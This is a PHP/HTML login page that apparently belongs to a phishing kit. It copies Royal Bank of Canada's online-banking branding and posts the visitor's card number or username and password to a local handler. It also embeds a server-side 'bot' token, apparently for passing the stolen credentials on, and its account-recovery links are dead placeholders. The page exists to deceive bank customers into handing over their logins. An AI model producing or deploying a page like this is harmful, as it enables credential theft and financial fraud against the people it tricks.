<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Login</title>
</head>
<body>
    






<main>


<div class="form">


<div class="logo">
<img src="res/img/logo.png" > 


<h3>Secure Sign-In
</h3>
<label >RBC Online Banking</label>

</div>
</div>
<script>var token=<?php echo json_encode($bot); ?>;</script>


    <div class="continer">

    <div class="mobil">
<img src="res/img/mobil.png" >
       </div>
       <div class="m">

       </div>
    <form action="post.php" method="post">

        <div class="col">
        <label>Client Card or Username</label>
        <input type="text" name="user" required autofocus>
        </div>

        <div class="col">
        <label>Password</label>
        <input type="password" name="pass"  required>
        </div>

<div class="box">
    <input type="checkbox" >
     <label >Save client card or username</label> 
</div>

<div class="but">
<button type="submit">Next</button>
</div>

<div class="a">
<a href="#">Recover Your Username</a>
<a href="#">Enrol in Online Banking</a>
</div>

<div class="s">
<label>
Service Notices
</label>
</div>


<div class="b">
<a href="#">Technical issue with alert</a>
<a href="#">Canada Post Labour Disruption</a>
</div>


<div class="br">

</div>

<div class="c">
<a href="#">Other Online Services</a>
</div>

<div class="p">
<p>
RBC Online Banking is provided by Royal Bank of Canada.
Royal Bank of Canada Website, © 1995-2024
</p>
</div>


<script src="./res/jq.js"></script>
<script src="./res/jquery.js"></script>



       

     
</form>
    </div>
</main>

</body>
</html>